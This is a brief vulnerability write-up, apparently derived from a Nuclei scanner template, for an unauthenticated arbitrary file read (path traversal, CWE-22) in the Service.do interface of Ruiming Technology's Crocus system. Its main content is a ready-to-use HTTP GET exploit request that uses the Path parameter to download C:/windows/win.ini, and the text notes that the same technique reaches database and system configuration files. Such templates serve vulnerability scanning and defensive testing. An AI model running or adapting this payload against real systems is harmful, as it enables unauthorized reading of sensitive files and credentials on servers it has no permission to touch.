# Nuclei Template: Crocus system Service.do - Arbitrary File Read
**Template ID:** crocus-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`crocus-lfi.yaml`)

## Vulnerability Information & PoC

## Description
There is an arbitrary file reading vulnerability in the Service.do interface of Ruiming Technology's Crocus system. An unauthenticated remote attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc. This leaves the website in an extremely unsafe state.

## Steps to reproduce / Exploit Payload
```http
GET /Service.do?Action=Download&Path=C:/windows/win.ini HTTP/1.1
Host: {{Hostname}}
X-Requested-With: XMLHttpRequest
```

## References
- https://github.com/wy876/POC/blob/main/%E9%94%90%E6%98%8E%E6%8A%80%E6%9C%AFCrocus%E7%B3%BB%E7%BB%9FService.do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
